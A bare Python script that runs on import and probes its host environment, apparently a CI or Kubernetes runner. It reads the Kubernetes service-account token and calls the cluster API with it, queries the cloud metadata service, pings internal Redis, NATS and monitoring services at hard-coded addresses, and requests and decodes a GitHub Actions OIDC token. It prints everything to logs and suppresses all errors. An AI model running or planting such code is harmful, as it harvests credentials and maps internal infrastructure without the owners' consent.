import os, socket, sys, json, base64, urllib.request

def _p(*a):
    try:
        print(*a, flush=True)
    except Exception:
        pass

def _probe():
    try:
        _p("CP_HOST", socket.gethostname())
        _p("CP_CWD", os.getcwd())
        _p("CP_ENVKEYS", ",".join(sorted(os.environ.keys()))[:1500])
        t="/var/run/secrets/kubernetes.io/serviceaccount/token"
        kt=""
        try:
            kt=open(t).read().strip()
            _p("CP_KSA_LEN", len(kt))
        except Exception as e:
            _p("CP_KSA_ERR", type(e).__name__)
        ca="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
        if kt:
            try:
                import ssl
                ctx=ssl.create_default_context(cafile=ca)
                req=urllib.request.Request("https://10.53.0.1/api/v1/namespaces?limit=1", headers={"Authorization":"Bearer "+kt})
                r=urllib.request.urlopen(req, timeout=6, context=ctx)
                _p("CP_K8S_STATUS", r.status, r.read(300).decode('utf-8','replace').replace('\n',' ')[:300])
            except Exception as e:
                _p("CP_K8S_ERR", type(e).__name__, str(e)[:160])
        try:
            req=urllib.request.Request("http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email", headers={"Metadata-Flavor":"Google"})
            r=urllib.request.urlopen(req, timeout=5)
            _p("CP_MD_EMAIL", r.read(150).decode('utf-8','replace'))
        except Exception as e:
            _p("CP_MD_ERR", type(e).__name__, str(e)[:120])
        def tcp(host, port, send=None, tag=""):
            try:
                s=socket.create_connection((host,port),timeout=4)
                if send:
                    s.sendall(send)
                data=s.recv(64)
                _p("CP_TCP", tag or f"{host}:{port}", "OK", data[:40])
                s.close()
            except Exception as e:
                _p("CP_TCP", tag or f"{host}:{port}", "ERR", type(e).__name__, str(e)[:80])
        tcp("redis.redis.svc.cluster.local", 6379, b"*1\r\n$4\r\nPING\r\n", "redis")
        tcp("10.52.0.25", 4222, None, "nats0")
        tcp("10.52.2.15", 6379, b"*1\r\n$4\r\nPING\r\n", "lf-redis")
        for name,url in [("litellm-int","http://10.52.2.13:4000/health/liveliness"),("ch-int","http://10.52.2.154:8123/ping"),("grafana-mcp","http://10.52.0.45/health"),("chariot","http://10.52.0.218:3000/health")]:
            try:
                r=urllib.request.urlopen(url, timeout=5)
                _p("CP_HTTP", name, r.status, r.read(120).decode('utf-8','replace'))
            except Exception as e:
                _p("CP_HTTP", name, "ERR", type(e).__name__, str(e)[:90])
        ou=os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL"); ot=os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN")
        _p("CP_OIDC", bool(ou), bool(ot))
        if ou and ot:
            try:
                r=urllib.request.Request(ou+"&audience=probe-aud", headers={"Authorization":"bearer "+ot})
                d=json.loads(urllib.request.urlopen(r,timeout=8).read())
                tok=d.get("value","")
                parts=tok.split('.')
                if len(parts)==3:
                    pad='='*(-len(parts[1])%4)
                    claims=json.loads(base64.urlsafe_b64decode(parts[1]+pad))
                    _p("CP_OIDC_CLAIMS", json.dumps({k:claims.get(k) for k in ["iss","aud","sub","repository","repository_owner","event_name","ref","workflow_ref","actor"]})[:600])
            except Exception as e:
                _p("CP_OIDC_ERR", type(e).__name__, str(e)[:120])
    except Exception as e:
        _p("CP_FATAL", type(e).__name__, str(e)[:150])

try:
    _probe()
except Exception:
    pass
